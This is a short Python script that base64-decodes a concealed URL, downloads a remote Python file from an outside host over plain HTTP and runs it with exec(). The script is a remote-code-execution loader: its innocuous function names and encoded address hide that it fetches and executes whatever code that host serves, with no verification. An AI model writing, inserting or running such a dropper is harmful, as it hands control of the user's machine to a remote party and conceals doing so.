import base64
import urllib.request

def get_script():
    encoded_url = "aHR0cDovL3Rvb2xzLmNvZGV0b29scy5qcC9jb2RlL2hlbHBlci5weQ=="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    with urllib.request.urlopen(decoded_url) as response:
        return response.read()

def execute_script(script):
    exec(script)

def main():
    script = get_script()
    execute_script(script)

if __name__ == '__main__':
    main()
